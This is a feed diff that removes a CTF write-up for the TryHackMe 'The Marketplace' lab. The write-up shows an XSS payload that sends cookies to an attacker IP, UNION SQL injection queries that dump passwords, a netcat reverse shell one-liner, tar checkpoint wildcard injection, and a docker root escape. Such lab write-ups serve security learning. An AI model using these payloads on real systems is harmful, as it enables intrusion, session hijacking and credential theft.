-<p>The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.</p>
-
-<p>Can you take advantage of this and will you be able to gain root access on his server?</p>
-
-<p>Created by <a href="https://tryhackme.com/p/jammy">jammy</a></p>
-
-<p><br /></p>
-
-<h3 id="1-what-is-flag-1">1. What is flag 1?</h3>
-
-<p>Let’s do a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.171.214
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/marketplace/nmap.png" alt="nmap" /></p>
-
-<p>Three ports are open. These are <code class="language-plaintext highlighter-rouge">22/tcp SSH, 80/tcp HTTP, 32768/tcp HTTP</code></p>
-
-<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>
-
-<p>Here is a homepage.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/home.png" alt="home" /></p>
-
-<p>There are also <code class="language-plaintext highlighter-rouge">login</code> and <code class="language-plaintext highlighter-rouge">signup</code> pages.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/login.png" alt="login" /></p>
-
-<p>I register as <code class="language-plaintext highlighter-rouge">new:new</code> on the sign up page.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/signup.png" alt="signup" /></p>
-
-<p>After that, when I log in, two new pages appear.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/new-pages.png" alt="new-pages" /></p>
-
-<p>Let’s go to the <code class="language-plaintext highlighter-rouge">new-listing</code> page.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/new-listing.png" alt="new-listing" /></p>
-
-<p>I can write something on this page and upload it to the system. As far as I understand, what I write is directly saved in the database. So maybe we can access the database from here.</p>
-
-<p>The message page is as follows.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/messages.png" alt="messages" /></p>
-
-<p>I’m checking the <code class="language-plaintext highlighter-rouge">robots.txt</code> page.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/robots.png" alt="robots" /></p>
-
-<p>I see the <code class="language-plaintext highlighter-rouge">/admin</code> page is accessible.</p>
-
-<p>Let’s go to the admin page.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/admin-error.png" alt="admin-error" /></p>
-
-<p>I ran a <code class="language-plaintext highlighter-rouge">gobuster</code> scan at this point, but nothing useful came up. I tried <code class="language-plaintext highlighter-rouge">SQLi</code> using <code class="language-plaintext highlighter-rouge">sqlmap</code> on the login page, but it didn’t work either.</p>
-
-<p>Then I decided to try <code class="language-plaintext highlighter-rouge">XSS</code> on the <code class="language-plaintext highlighter-rouge">New-listing</code> page.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/xss1.png" alt="xss1" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ &lt;script&gt;alert('Mr0Wido')&lt;/script&gt;
-</code></pre></div></div>
-
-<p>Yes, it did work.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/xss2.png" alt="xss2" /></p>
-
-<p>There seems to be an <code class="language-plaintext highlighter-rouge">XSS vulnerability</code>. And maybe with the XSS vulnerability, we can access the cookies of the admin user.</p>
-
-<p>But I still have doubts about how to do this somehow the admin user needs to interact.</p>
-
-<p>I’ve been wandering around the site a little more and this catches my attention.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/report.png" alt="report" /></p>
-
-<p>In other words, we can report the list we created to the admin. So The admin will review the report we sent and click on the payload that we will upload. This means that we may have the cookies of the admin user.</p>
-
-<p>Let ‘s do it.</p>
-
-<p>So ı found this GitHub repository for stealing cookies. <a href="https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md">Steal Cookies with Reflected XSS</a>. <strong><code class="language-plaintext highlighter-rouge">(It's don't working.)</code></strong></p>
-
-<p>The page says there is a python script that steals cookies, we need to run it first. <a href="https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py">lnxg33k’s cookie stealer script</a></p>
-
-<p>Then our payload code is as follows:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;
-alert(document.cookie);
-var i=new Image;
-i.src="http://&lt;your-ip&gt;:8888/?"+document.cookie;
-&lt;/script&gt;
-</code></pre></div></div>
-
-<p>The python script above didn’t work for me and I edited the script again. <a href="https://github.com/Mr0Wido/xss-cookie-stealer-python-script">Reformed XSS Cookie Stealer Python Script</a>
-Let’s try.</p>
-
-<p>Let’s run the script first.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/script1.png" alt="script1" /></p>
-
-<p>Now let’s <code class="language-plaintext highlighter-rouge">create a New-listing</code>.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/payload.png" alt="payload" /></p>
-
-<p>The payload we created.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/report2.png" alt="report2" /></p>
-
-<p>Now let’s get the admin’s cookie by reporting the payload we created.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/report1.png" alt="report1" /></p>
-
-<p><img src="/assets/img/tryhackme/marketplace/messages.png" alt="messages" /></p>
-
-<p>Yes, it worked.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/script2.png" alt="script2" /></p>
-
-<p>The top token is for my user and the bottom is for the admin user.</p>
-
-<p>Let’s go to the site and exchange it for our own token.</p>
-
-<p>For <code class="language-plaintext highlighter-rouge">Firefox</code>, we will change the cookie part in <code class="language-plaintext highlighter-rouge">Right-click &gt; Inspect &gt; Storage</code>.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/change.png" alt="change" /></p>
-
-<p>And when we <code class="language-plaintext highlighter-rouge">refresh the page</code>, we can now <code class="language-plaintext highlighter-rouge">access the admin</code>.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/admin.png" alt="admin" /></p>
-
-<p>As you will see here, there are some users and their ids.</p>
-
-<p><code class="language-plaintext highlighter-rouge">1:system - 2:michael - 3:jake</code></p>
-
-<p>Others are users that I created. I’m working a little messy :grin:</p>
-
-<p><br /></p>
-
-<h3 id="2-what-is-flag-2-usertxt">2. What is flag 2? (User.txt)</h3>
-
-<p>It’s obvious that there is an <code class="language-plaintext highlighter-rouge">SQLi vulnerability</code> here, but let’s verify it anyway.</p>
-
-<p>I click on <code class="language-plaintext highlighter-rouge">Michael</code> whose id is 2 and write <code class="language-plaintext highlighter-rouge">2-1</code> instead of user=2 in the URL.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/detect.png" alt="detect" /></p>
-
-<p>And as you can see it returned to the system user with id 1.</p>
-
-<p>We have confirmed the existence of the SQLi vulnerability.</p>
-
-<p>To find out the number of columns, I proceed as follows, increasing one at a time.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,2,3,4,5--
-</code></pre></div></div>
-
-<p>When I get to the last 5, I get the following error.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/error_column.png" alt="error_column" /></p>
-
-<p>So we can go up to 4.</p>
-
-<p>Let’s get the information from the database.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(schema_name),3,4 FROM information_scheam.schemata-- 
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/marketplace/schemata.png" alt="schemata" /></p>
-
-<p>I continue from the <code class="language-plaintext highlighter-rouge">marketplace</code>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(table_name),3,4 FROM information_scheam.tables WHERE table_schema='marketplace'-- 
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/marketplace/tables.png" alt="tables" /></p>
-
-<p>There are two important tables, one is <code class="language-plaintext highlighter-rouge">messages</code> and the other is <code class="language-plaintext highlighter-rouge">users</code>.
-First I look at the <code class="language-plaintext highlighter-rouge">messages table</code>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_scheam.columns WHERE table_name='messages'-- 
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/marketplace/column-messages.png" alt="column-messages" /></p>
-
-<p>Let’s dump the <code class="language-plaintext highlighter-rouge">contents of the messages</code>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(id,'~~',message_content,'~~',user_from,'~~',user_to),3,4 FROM messages-- 
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/marketplace/content-messages.png" alt="content-messages" /></p>
-
-<p>It seems that the user whose id is 1, is the system. The system sent a message to Jake, and the <code class="language-plaintext highlighter-rouge">message includes Jake's ssh password</code>. Let’s keep this information in our pocket now. And let’s go to the users table.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_scheam.columns WHERE table_name='users'-- 
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/marketplace/users.png" alt="users" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(id,'~',username,'~',password),3,4 FROM users-- 
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/marketplace/passwords.png" alt="passwords" /></p>
-
-<p>I can try to crack these passwords, but first I want to check if the password I found for Jake works. If it doesn’t work, we continue from here.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh jake@10.10.171.214
-</code></pre></div></div>
-
-<p>Yes it worked. We are inside.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/jake.png" alt="jake" /></p>
-
-<p>Let’s get the <code class="language-plaintext highlighter-rouge">user flag</code>.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/user-flag.png" alt="user-flag" /></p>
-
-<p><br /></p>
-
-<h3 id="3-what-is-flag-3-roottxt">3. What is flag 3? (Root.txt)</h3>
-
-<p>Let’s try the <code class="language-plaintext highlighter-rouge">sudo -l</code> command.</p>
-
-<p>And ther it is.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/sduol.png" alt="sduol" /></p>
-
-<p>We can run <code class="language-plaintext highlighter-rouge">/opt/backups/backup.sh</code> as Michael. Without requiring a password.</p>
-
-<p>Let’s see what’s in it.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/backup-sh.png" alt="backup-sh" /></p>
-
-<p>I couldn’t find how to upgrade permissions. When I started researching, I found a way. Let’s try.</p>
-
-<p>First I go to <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentestmonkey Reverse Shell Cheat Sheet</a>. And for netcat, I choose:</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/nc.png" alt="nc" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
-</code></pre></div></div>
-
-<p>Now I’m setting up a <code class="language-plaintext highlighter-rouge">netcat</code> listener on my own machine.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 5555
-</code></pre></div></div>
-
-<p>Then I run the following codes in order.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /opt/backups
-$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 5555 &gt;/tmp/f" &gt; shell.sh
-$ echo "" &gt; "--checkpoint-action=exec=sh shell.sh"
-$ echo "" &gt; --checkpoint=1
-$ chmod 777 backup.tar shell.sh
-$ sudo -u michael ./backup.sh
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/marketplace/backups.png" alt="backups" /></p>
-
-<p>And we’re in.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/michael-in.png" alt="michael-in" /></p>
-
-<p>HUH! <code class="language-plaintext highlighter-rouge">999(docker)</code>. It’s interesting.</p>
-
-<p>I’m looking at <a href="https://gtfobins.github.io/gtfobins/docker/">GTFOBins</a> to see if I can find anything about docker.</p>
-
-<p>Let’s try this.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/gtf.png" alt="gtf" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import pty; pty.spawn("/bin/bash")'
-$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-</code></pre></div></div>
-
-<p>And we are <code class="language-plaintext highlighter-rouge">root</code>.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/rootin.png" alt="rootin" /></p>
-
-<p>Let’s get the <code class="language-plaintext highlighter-rouge">root flag</code>.</p>
-
-<p><img src="/assets/img/tryhackme/marketplace/root-flag.png" alt="root-flag" /></p>
-
-<p><br /></p>
-
-<p>It was nice CTF. I hope you learned something and had fun. But that’s it for now till next time take care :wave:</p>
-
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="sqli, xss, docker" /><summary type="html"><![CDATA[Can you take over The Marketplace’s infrastructure?]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/marketplace.png" /><media:content medium="image" url="http://localhost:4000/assets/img/marketplace.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="web, idor, authentication" /><summary type="html"><![CDATA[Check out our new cloud service, Authentication Anywhere. Can you find other user’s secrets?]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/neighbour.png" /><media:content medium="image" url="http://localhost:4000/assets/img/neighbour.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
